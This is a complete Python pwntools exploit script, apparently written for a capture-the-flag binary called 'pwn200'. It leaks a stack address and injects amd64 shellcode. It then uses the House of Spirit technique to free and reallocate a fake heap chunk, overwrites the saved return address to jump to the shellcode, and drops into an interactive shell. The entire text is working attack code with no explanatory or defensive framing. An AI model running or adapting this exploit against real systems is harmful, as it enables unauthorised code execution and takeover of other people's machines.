from pwn import *

io = remote('0.0.0.0', 10001)
#io = process('./pwn200')

shellcode = asm(shellcraft.amd64.linux.sh(), arch = 'amd64')

def leak():
	global fake_addr
	global shellcode_addr

	payload = shellcode.rjust(48, 'A')
	io.sendafter("who are u?\n", payload)

	io.recvuntil(payload)
	rbp_addr = u64(io.recvn(6).ljust(8, '\x00'))
	shellcode_addr = rbp_addr - 0x20 - len(shellcode)
	fake_addr = rbp_addr - 0x20 - 0x30 - 0x40		# make fake.size = 0x40
	log.info("shellcode address: 0x%x" % shellcode_addr)
	log.info("fake chunk address: 0x%x" % fake_addr)

def house_of_spirit():
	io.sendlineafter("give me your id ~~?\n", '65')	# next.size = 0x41

	fake_chunk  = p64(0) * 5
	fake_chunk += p64(0x41)							# fake.size
	fake_chunk  = fake_chunk.ljust(0x38, '\x00')
	fake_chunk += p64(fake_addr)					# overwrite pointer
	io.sendafter("give me money~\n", fake_chunk)

	io.sendlineafter("choice : ", '2')				# free(fake_addr)
	io.sendlineafter("choice : ", '1')				# malloc(fake_addr)
	io.sendlineafter("long?", '48')

	payload = "A" * 0x18
	payload += p64(shellcode_addr) 					# overwrite return address
	payload = payload.ljust(48, '\x00')
	io.sendafter("48\n", payload)

def pwn():
	io.sendlineafter("choice", '3')
	io.interactive()

leak()
house_of_spirit()
pwn()

